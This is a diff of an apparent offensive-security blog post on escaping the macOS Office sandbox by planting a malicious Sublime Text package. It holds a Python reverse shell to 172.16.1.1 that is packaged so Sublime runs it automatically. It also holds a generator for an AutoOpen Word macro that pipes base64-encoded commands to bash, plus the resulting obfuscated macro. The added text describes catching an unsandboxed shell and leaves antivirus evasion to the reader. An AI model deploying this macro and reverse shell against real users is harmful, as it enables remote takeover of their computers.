@@ -76,23 +76,23 @@
 <p><code>mkdir ~/Library/Application Support/Sublime Text 3/Packages/legitimate</code></p>
 <p>Then add your benign python code to that folder.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat &gt; ~/Library/Application Support/Sublime Text 3/Packages/legitimate.py <span style="color:#e6db74">&lt;&lt; EOF
-</span><span style="color:#e6db74">import socket, subprocess, os;
-</span><span style="color:#e6db74">s=socket.socket(socket.AF_INET,so.SOCK_STREAM);
-</span><span style="color:#e6db74">s.connect((&#34;172.16.1.1&#34;,8080));
+</span><span style="color:#e6db74">import sublime, sublime_plugin, socket, subprocess, os;
+</span><span style="color:#e6db74">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+</span><span style="color:#e6db74">s.connect((&#34;172.16.1.1&#34;,8088));
 </span><span style="color:#e6db74">os.dup2(s.fileno(),0);
 </span><span style="color:#e6db74">os.dup2(s.fileno(),1);
 </span><span style="color:#e6db74">os.dup2(s.fileno(),2);
-</span><span style="color:#e6db74">p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;);
+</span><span style="color:#e6db74">p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);
 </span><span style="color:#e6db74">EOF</span>
 </code></pre></div><p>Now in Sublime Text, <code>Ctrl + Shift + P</code> &gt; Create Package &gt; legitimate &gt; Default</p>
 <p>And your new package file will be at <code>~/Desktop/test.sublime-package</code>.</p>
 <p>This file can now be copied to <code>~/Library/Application Support/Sublime Text 3/Installed Packages/</code> or <code>%APPDATA%\Sublime Text 3\Installed Packages\</code> where Sublime will automatically pick it up and run your code.</p>
 <blockquote>
 <p>Note: I did run into some issues with Package Control not compiling my code on macOS, but manually compiling before creating the package seemed to get things working.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">% cd ~/Library/Application Support/Sublime Text 3/Packages
+<pre><code>% cd ~/Library/Application\ Support/Sublime\ Text\ 3/Packages/legitimate
 % python -m compileall legitimate.py
-% rm legitimate.py <span style="color:#75715e">#YMMV</span>
-</code></pre></div></blockquote>
+% rm legitimate.py #YMMV```
+</code></pre></blockquote>
 <h2 id="macros">Macros</h2>
 <p>So how do we leverage all that to seamlessly escape the Office sandbox? The following code snippet is sufficient to have Sublime execute Python of our choosing outside the sandbox. Or rather than the code snippet, copy the binary sublime-package file to the <code>Installed Packages</code> to provide some obfuscation.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> os
@@ -130,32 +130,34 @@ macro <span style="color:#f92672">=</span> []
 <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#e6db74">Sub AutoOpen()</span><span style="color:#e6db74">
 </span><span style="color:#e6db74"></span><span style="color:#e6db74">Dim Str</span><span style="color:#e6db74">
 </span><span style="color:#e6db74"></span><span style="color:#e6db74">{}</span><span style="color:#e6db74">
-</span><span style="color:#e6db74"></span><span style="color:#e6db74">MacScript </span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">do shell script </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">echo</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74"> &amp; Str &amp; </span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74"> | /usr/bin/base64 -D | /bin/bash</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74"> </span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">MacScript </span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">do shell script </span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">echo </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74"> </span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74"> &amp; Str &amp; </span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74"> | /usr/bin/base64 -D | /bin/bash</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74"> </span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">
 </span><span style="color:#e6db74"></span><span style="color:#e6db74">End Sub</span><span style="color:#e6db74">
 </span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;&#39;&#39;</span>)<span style="color:#f92672">.</span>format(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>join(macro))
 
 </code></pre></div><p>Leaving you with something like the following. AV and EDR avoidance obviously up to you.</p>
 <pre><code>Sub AutoOpen()
 Dim Str
-str = &quot;ZWNobyAiaW1wb3J0IGJhc2U2NCwgZXhlYyhiYXNlNj&quot;
-str = str + &quot;QuYjY0ZGVjb2RlKCdhVzF3YjNKMElHOXpDbVp2Y25O&quot;
-str = str + &quot;MVlteHBiV1VnUFNBbkp5Y0thVzF3YjNKMElHOXpDbT&quot;
-str = str + &quot;l6TG5ONWMzUmxiU2duYjNCbGJpQXRZU0F2UVhCd2JH&quot;
-str = str + &quot;bGpZWFJwYjI1ekwwTmhiR04xYkdGMGIzSXVZWEJ3Sn&quot;
-str = str + &quot;lrS0p5Y25DbmRwZEdnZ2IzQmxiaWduYkdWbmFYUnBi&quot;
-str = str + &quot;V0YwWldacGJHVXVkSGgwSnl3Z0ozY25LU0JoY3lCbU&quot;
-str = str + &quot;9nb2dJQ0FnSUNBZ0lHWXVkM0pwZEdVb1ptOXljM1Zp&quot;
-str = str + &quot;YkdsdFpTa0tDbTl6TG5ONWMzUmxiU2dpWTNBZ2JHVm&quot;
-str = str + &quot;5hWFJwYldGMFpXWnBiR1V1ZEhoMElDOVZjMlZ5Y3k4&quot;
-str = str + &quot;a1ZWTkZVaTlNYVdKeVlYSjVMMEZ3Y0d4cFkyRjBhVz&quot;
-str = str + &quot;l1SUZOMWNIQnZjblF2VTNWaWJHbHRaU0JVWlhoMElE&quot;
-str = str + &quot;TXZTVzV6ZEdGc2JHVmtJRkJoWTJ0aFoyVnpMMzVjSk&quot;
-str = str + &quot;d4bFoybDBhVzFoZEdWZmNHeDFaMmx1TG5OMVlteHBi&quot;
-str = str + &quot;V1V0Y0dGamEyRm5aU0lwQ2c9PScpKTsiIHwgL3Vzci&quot;
-str = str + &quot;9iaW4vcHl0aG9uICY=&quot;
-MacScript &quot;do shell script \&quot;&quot;echo&quot; &amp; Str &amp; &quot;\&quot;&quot;|base64 -D|bash&quot;&quot; &quot;
+str = &quot;ZWNobyAiaW1wb3J0IGJhc2U2NCBhcyBiLCBzeXM7IG&quot;
+str = str + &quot;V4ZWMoYi5iNjRkZWNvZGUoJ2ltcG9ydCBvczsgb3Mu&quot;
+str = str + &quot;c3lzdGVtKCJvcGVuIGh0dHBzOi8vd3d3LnlvdXR1Ym&quot;
+str = str + &quot;UuY29tL3dhdGNoP3Y9b0hnNVNKWVJIQTA7IG9wZW4g&quot;
+str = str + &quot;aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj&quot;
+str = str + &quot;1vSGc1U0pZUkhBMDtvcGVuIGh0dHBzOi8vd3d3Lnlv&quot;
+str = str + &quot;dXR1YmUuY29tL3dhdGNoP3Y9b0hnNVNKWVJIQTA7Ii&quot;
+str = str + &quot;knKSk7IiB8IHB5dGhvbiAgJg==&quot;
+MacScript &quot;do shell script &quot;&quot; echo \&quot;&quot; &quot; &amp; Str &amp; &quot; \&quot;&quot; | /usr/bin/base64 -D | /bin/bash&quot;&quot; &quot;
 End Sub
-</code></pre>
+</code></pre><p>Assuming that macro was run, the attacker is receives a shell but one restricted to the Office sandbox. In the following screenshot you see access to <code>/tmp/</code> is not permitted, and any attempt to access user directories is met with the same message.</p>
+<figure>
+    <img src="https://www.thesubtlety.com/img/sublime-sandbox.png"/> 
+</figure>
+
+<p>But once we copy our malicious Sublime package to the Installed Packages directory, we immediately see another reverse shell come in, this time without the sandbox restrictions.</p>
+<figure>
+    <img src="https://www.thesubtlety.com/img/sublime-out-of-the-sandbox.png"/> 
+</figure>
+
+
 </div>
 
 
